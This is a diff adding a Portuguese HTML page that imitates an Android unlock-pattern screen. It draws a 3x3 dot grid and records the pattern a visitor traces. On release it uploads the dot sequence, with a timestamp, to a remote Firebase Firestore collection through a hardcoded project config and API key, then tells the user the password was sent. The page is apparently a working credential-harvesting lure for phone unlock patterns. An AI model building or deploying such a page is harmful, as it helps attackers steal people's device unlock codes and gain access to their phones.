@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Senha Padrão Android</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      user-select: none;
+    }
+    canvas {
+      background-color: #fff;
+      border: 1.5px solid #ccc;
+      border-radius: 14px;
+      touch-action: none;
+      box-shadow: 0 0 12px rgba(0,0,0,0.1);
+    }
+  </style>
+</head>
+<body>
+  <canvas id="canvas" width="320" height="320"></canvas>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyCvx4_m1axcdhmn8pqtHVXopQavatcX1NM",
+      authDomain: "senha-padrao.firebaseapp.com",
+      projectId: "senha-padrao",
+      storageBucket: "senha-padrao.firebasestorage.app",
+      messagingSenderId: "947119781442",
+      appId: "1:947119781442:web:a76c46c9c3894fa96e5fdb"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    const radius = 12;
+    const gridSize = 3;
+    const margin = 50;
+
+    // Posição dos 9 pontos 3x3 na grade
+    const points = [];
+    for(let row=0; row<gridSize; row++) {
+      for(let col=0; col<gridSize; col++) {
+        points.push({
+          x: margin + col * ((canvas.width - 2*margin) / (gridSize -1)),
+          y: margin + row * ((canvas.height - 2*margin) / (gridSize -1)),
+          index: row * gridSize + col + 1
+        });
+      }
+    }
+
+    let selectedPoints = [];
+    let drawing = false;
+
+    function getPos(e) {
+      const rect = canvas.getBoundingClientRect();
+      if (e.touches && e.touches.length > 0) {
+        return {
+          x: e.touches[0].clientX - rect.left,
+          y: e.touches[0].clientY - rect.top
+        };
+      } else if (e.clientX !== undefined && e.clientY !== undefined) {
+        return {
+          x: e.clientX - rect.left,
+          y: e.clientY - rect.top
+        };
+      }
+    }
+
+    function distance(p1, p2) {
+      return Math.hypot(p1.x - p2.x, p1.y - p2.y);
+    }
+
+    function drawGrid() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+      // Desenha linhas entre os pontos selecionados
+      if (selectedPoints.length > 0) {
+        ctx.strokeStyle = "#3a86ff";
+        ctx.lineWidth = 5;
+        ctx.lineJoin = 'round';
+        ctx.lineCap = 'round';
+        ctx.beginPath();
+        ctx.moveTo(selectedPoints[0].x, selectedPoints[0].y);
+        for (let i =1; i < selectedPoints.length; i++) {
+          ctx.lineTo(selectedPoints[i].x, selectedPoints[i].y);
+        }
+        ctx.stroke();
+      }
+
+      // Desenha os pontos
+      points.forEach(p => {
+        ctx.beginPath();
+        ctx.fillStyle = selectedPoints.includes(p) ? "#3a86ff" : "#ccc";
+        ctx.strokeStyle = "#888";
+        ctx.lineWidth = 2;
+        ctx.arc(p.x, p.y, radius, 0, Math.PI * 2);
+        ctx.fill();
+        ctx.stroke();
+
+        if(selectedPoints.includes(p)) {
+          // Desenha círculo interno para o ponto selecionado
+          ctx.beginPath();
+          ctx.fillStyle = "#1e3a8a";
+          ctx.arc(p.x, p.y, radius / 2, 0, Math.PI * 2);
+          ctx.fill();
+        }
+      });
+    }
+
+    function checkPoint(pos) {
+      for (const p of points) {
+        if (!selectedPoints.includes(p) && distance(pos, p) < radius + 15) {
+          return p;
+        }
+      }
+      return null;
+    }
+
+    function startDraw(e) {
+      e.preventDefault();
+      drawing = true;
+      selectedPoints = [];
+      const pos = getPos(e);
+      const p = checkPoint(pos);
+      if (p) selectedPoints.push(p);
+      drawGrid();
+    }
+
+    function moveDraw(e) {
+      if (!drawing) return;
+      e.preventDefault();
+      const pos = getPos(e);
+      const p = checkPoint(pos);
+      if (p && !selectedPoints.includes(p)) {
+        selectedPoints.push(p);
+      }
+      drawGrid();
+    }
+
+    async function endDraw(e) {
+      if (!drawing) return;
+      drawing = false;
+      drawGrid();
+
+      if (selectedPoints.length > 0) {
+        try {
+          await addDoc(collection(db, "padrões"), {
+            padrao: selectedPoints.map(p => p.index),
+            timestamp: new Date()
+          });
+          alert("Senha enviada!");
+        } catch (err) {
+          alert("Erro ao enviar: " + err.message);
+        }
+      }
+
+      setTimeout(() => {
+        selectedPoints = [];
+        drawGrid();
+      }, 1000);
+    }
+
+    canvas.addEventListener("touchstart", startDraw);
+    canvas.addEventListener("touchmove", moveDraw);
+    canvas.addEventListener("touchend", endDraw);
+
+    canvas.addEventListener("mousedown", startDraw);
+    canvas.addEventListener("mousemove", moveDraw);
+    canvas.addEventListener("mouseup", endDraw);
+    canvas.addEventListener("mouseleave", () => { drawing = false; });
+
+    drawGrid();
+  </script>
+</body>
+</html>
+
+
+
